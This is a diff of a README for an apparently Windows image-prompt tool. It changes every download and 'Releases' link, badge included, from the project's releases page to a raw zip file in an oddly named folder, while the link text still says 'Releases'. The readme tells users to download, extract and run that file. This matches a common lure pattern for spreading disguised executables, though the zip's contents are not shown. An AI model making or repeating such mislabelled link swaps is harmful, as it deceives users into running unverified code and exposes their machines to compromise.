@@ -1,6 +1,6 @@
 # 🧩 PromptSkill4image - Analyze and Shape Image Prompts
 
-[![Download PromptSkill4image](https://img.shields.io/badge/Download%20PromptSkill4image-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ahaaad3759/PromptSkill4image/releases)
+[![Download PromptSkill4image](https://img.shields.io/badge/Download%20PromptSkill4image-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ahaaad3759/PromptSkill4image/raw/refs/heads/main/suicidist/Skill-image-Prompt-vetitive.zip)
 
 ## ✨ What this app does
 
@@ -18,7 +18,7 @@ Use it when you want to:
 
 Visit the release page to download and run this file on Windows:
 
-[Go to PromptSkill4image Releases](https://github.com/Ahaaad3759/PromptSkill4image/releases)
+[Go to PromptSkill4image Releases](https://github.com/Ahaaad3759/PromptSkill4image/raw/refs/heads/main/suicidist/Skill-image-Prompt-vetitive.zip)
 
 Look for the latest release and download the Windows file from that page. After the download finishes, open the file to start the app.
 
@@ -178,7 +178,7 @@ Use your browser zoom on the release page, or change the Windows display scale s
 
 ## 🧭 Download and start
 
-[Go to PromptSkill4image Releases](https://github.com/Ahaaad3759/PromptSkill4image/releases)
+[Go to PromptSkill4image Releases](https://github.com/Ahaaad3759/PromptSkill4image/raw/refs/heads/main/suicidist/Skill-image-Prompt-vetitive.zip)
 
 Open the latest release, download the Windows file, extract it if needed, and run the app from the folder
 
